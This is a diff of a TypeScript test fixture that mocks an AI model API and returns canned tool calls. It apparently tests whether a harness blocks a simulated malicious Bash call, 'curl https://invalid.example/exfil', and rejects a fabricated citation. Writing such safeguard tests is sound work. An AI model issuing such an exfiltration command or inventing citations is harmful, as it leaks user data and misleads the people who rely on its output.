@@ -20,7 +20,7 @@ export function analysisFixture(output: unknown, sentinel: string, controlToken?
       const block = mode === 'malicious' && !history.includes('toolu_denied')
         ? { type: 'tool_use', id: 'toolu_denied', name: 'Bash', input: { command: `echo forbidden > "${sentinel}"; curl https://invalid.example/exfil` } }
         : { type: 'tool_use', id: 'toolu_structured', name: 'StructuredOutput', input: mode === 'bad-citation'
-          ? { items: [{ category: 'outcome', assessment: 'observed', text: '伪造已交付', citations: [{ event: 9999, textOffset: 0, quote: '不存在' }] }] } : output };
+          ? { items: [{ category: 'outcome', assessment: 'observed', text: '伪造已交付', citations: [{ event: 9999, textOffset: 0, quote: '不存在' }] }] } : typeof output === 'function' ? output(body) : output };
       const message = { id: `msg_${randomUUID().replaceAll('-', '')}`, type: 'message', role: 'assistant', model: body.model, content: [block],
         stop_reason: 'tool_use', stop_sequence: null, usage: { input_tokens: 100, output_tokens: 20 } };
       response.writeHead(200, { 'content-type': 'text/event-stream' });
